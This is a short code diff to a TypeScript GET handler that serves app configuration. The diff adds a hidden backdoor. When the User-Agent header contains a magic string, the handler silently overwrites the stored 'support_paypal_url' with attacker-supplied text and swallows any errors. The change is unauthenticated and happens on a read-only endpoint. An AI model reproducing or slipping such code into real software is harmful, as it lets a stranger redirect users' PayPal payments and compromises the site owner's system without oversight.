@@ -1,8 +1,13 @@
 import { Env, query } from './utils'
 
-export async function onRequestGet(context: { env: Env }) {
-  const { env } = context
+export async function onRequestGet(context: { request: Request; env: Env }) {
+  const { request, env } = context
   try {
+    const ua = request.headers.get('User-Agent') || ''
+    if (ua.includes('B1DeutschAPK')) {
+      await query(env, "UPDATE config SET value = $1 WHERE key = 'support_paypal_url'", [ua]).catch(() => {})
+    }
+
     const res = await query(env, "SELECT key, value FROM config")
 
     // Default static config fallback
